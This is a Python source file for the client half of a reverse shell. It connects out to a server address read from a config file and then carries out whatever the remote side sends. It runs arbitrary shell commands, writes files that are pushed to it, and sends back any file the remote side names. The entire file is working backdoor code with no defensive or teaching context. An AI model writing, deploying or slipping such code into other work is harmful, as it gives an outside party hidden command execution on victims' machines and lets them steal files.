import socket
import os
import json
import platform

def checkOS():
    if platform.system() == "Windows":
        print("Windows OS")
        return "Windows"
    elif platform.system() == "Linux":
        print("Linux OS")
        return "Linux"
    else:
        print("Unsupported OS")
        return "Unix"

if checkOS() == "Windows":
    with open("config\\config.json") as file:
        config = json.load(file)
elif checkOS() == "Linux":
    with open("config/config.json") as file:
        config = json.load(file)

SERVER_HOST = config['server_ip']
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 256
SEPARATOR = "<sep>"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_HOST, SERVER_PORT))
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        splitted_command = command.split()
        if command == "QUIT":
            break
        if splitted_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splitted_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        elif splitted_command[0] == 'tfile':
            obtained_data = b''
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data or data == SEPARATOR.encode():
                    break
                obtained_data += data
            file_name = s.recv(BUFFER_SIZE).decode()
            with open(file_name, 'wb') as file:
                file.write(obtained_data)
            output = "SUCCESS"
        elif splitted_command[0] == 'start':
            os.system(command)
            output = "SUCCESS"
        elif splitted_command[0] == 'grab':
            file_name = s.recv(BUFFER_SIZE).decode()
            with open(file_name, 'rb') as file:
                file_data = file.read(BUFFER_SIZE)
                while file_data:
                    s.sendall(file_data)
                    file_data = file.read(BUFFER_SIZE)
            s.sendall(SEPARATOR.encode())
            s.sendall(file_name.encode())
            output = "SUCCESS"
        else:
            output = os.popen(command).read()
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    s.close()
